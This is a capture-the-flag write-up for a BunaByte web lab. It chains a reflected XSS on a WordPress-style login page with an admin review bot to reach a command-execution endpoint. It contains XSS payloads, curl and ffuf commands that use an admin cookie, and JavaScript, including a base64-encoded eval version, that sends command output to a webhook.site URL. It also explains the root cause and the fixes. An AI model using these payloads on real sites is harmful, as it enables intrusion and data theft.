---
title: "XSS2Shell — Abyssinia Blog"
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "web"
  - "bunabyte"
category: "web"
platform: "BunaByte"
---

# XSS2Shell — Abyssinia Blog

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

Natnael Sisay — CTC-1475-26

Target: https://aae784cd-06e1-444d-8ab6-aa93ee1cdff1.lab.bunabyte.com

## Flag

```
[REDACTED]
```

## What the lab asks

The site looks like WordPress. The question says: chain a pre-auth reflected XSS on the login page with the admin bot to reach RCE and take the flag. So the goal is not just to pop an alert. The goal is to run a command on the server as the admin.

## The chain in plain words

1. The login page shows an error message with your username in it. It puts the username in the page without cleaning it. That is the bug.
2. The site has a "submit a link for security review" form. A real admin opens what you submit.
3. The admin opens your link in a browser that already has the admin cookie.
4. Your JavaScript runs as the admin. It calls an admin-only command endpoint. It reads the flag. It sends the flag out to a server you control.

## Step by step

### 1. Look at the login page

Open `GET /wp-login.php?log=TEST`. The word TEST comes back inside the error banner, unescaped.
So `log` is the injection point. Try a small payload:

```
/wp-login.php?log=<img src=x onerror=alert(1)>
```

The script runs in the page. No login needed. This is the pre-auth reflected XSS.

### 2. Find the admin endpoint

The site has very few routes: `/`, `/wp-login.php`, `POST /submit-review`, `/drop`, `/config/.env`, `/style.css`.
A normal wordlist sweep found nothing new. The reason: the hidden route answers 403 without the cookie, so a sweep that filters on 404 sees nothing useful.

Run the same sweep with the admin cookie and keep all status codes:

```
ffuf -u https://LAB/FUZZ -w words.txt \
     -H 'Cookie: token=supersecretadmintoken42' \
     -mc all -fc 404
```

Hit: `/admin/exec`.

- No cookie: `403 {"error":"forbidden — admin only"}`
- With cookie, no `cmd`: `400 {"error":"missing ?cmd= parameter"}`
- With cookie and `cmd`: command output.

```
$ curl -H 'Cookie: token=supersecretadmintoken42' \
       'https://LAB/admin/exec?cmd=id'
uid=1000(node) gid=1000(node) groups=1000(node)
```

That is the RCE. The code is `execSync(cmd)` behind a cookie check.

### 3. Take the flag

```
$ curl -H 'Cookie: token=supersecretadmintoken42' \
       --get --data-urlencode 'cmd=cat /app/flag.txt' \
       'https://LAB/admin/exec'
[REDACTED]
```

### 4. Do it the intended way (through the bot, not with the cookie)

Submit a login link that carries the payload. The bot opens it with the admin cookie set, the script calls `/admin/exec` on the same origin, and sends the output to a webhook.

Script that runs in the admin's browser:

```javascript
fetch('/admin/exec?cmd=' + encodeURIComponent('cat /app/flag.txt'))
  .then(r => r.text())
  .then(t => { new Image().src = 'https://webhook.site/TOKEN/?f=' + encodeURIComponent(t); });
```

Submit it:

```
POST /submit-review
url=http://localhost:1337/wp-login.php?log=<img src=x onerror="eval(atob('BASE64'))">
```

Result: the webhook got `[REDACTED]` from `195.201.32.126` — the lab server's own address, so the flag came from the bot's browser session, not from us.

## Why the first attempts missed it

- The route is not in any wordlist. It is `/admin/exec`.
- Without the cookie it returns 403, not 404. A sweep that only prints 200s, or that filters 404 and shows a short list, still hid it because the sweep was run without the cookie.
- The cookie value is in `/config/.env` and is also readable from the bot page (`document.cookie`), because the bot sets it with `httpOnly: false` on purpose.
- The bug is in the app on purpose: `execSync(cmd)` with only a cookie check.

## Root cause

Two small mistakes chained:

1. Reflected XSS: user input goes into the HTML without escaping.
2. A dangerous admin action is protected by a cookie that JavaScript can read, on the same origin as the XSS. So the XSS becomes the admin.

Fix: escape the login error output. Use `httpOnly` cookies. Never run shell commands from an HTTP handler. Put the admin action behind a form with CSRF protection and re-authentication.

## Exploitation

1. **Direct exploitation (with recovered admin cookie):**
   ```bash
   curl -s -H 'Cookie: token=supersecretadmintoken42' \
        --get --data-urlencode 'cmd=cat /app/flag.txt' \
        'https://LAB/admin/exec'
   ```

2. **Full chain (via admin bot XSS):**
   Send the base64-encoded JavaScript payload via the review submission endpoint:
   ```bash
   curl -s -X POST 'https://LAB/submit-review' \
        -d 'url=http://localhost:1337/wp-login.php?log=<img src=x onerror="eval(atob(\x27ZmV0Y2goJy9hZG1pbi9leGVjP2NtZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KCdjYXQgL2FwcC9mbGFnLnR4dCcpKS50aGVuKHIgPT4gci50ZXh0KCkpLnRoZW4odCA9PiB7IG5ldyBJbWFnZSgpLnNyYyA9ICdodHRwczovL3dlYmhvb2suc2l0ZS9UT0tFTi8/Zj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHQpOyB9KTs=\x27))">'
   ```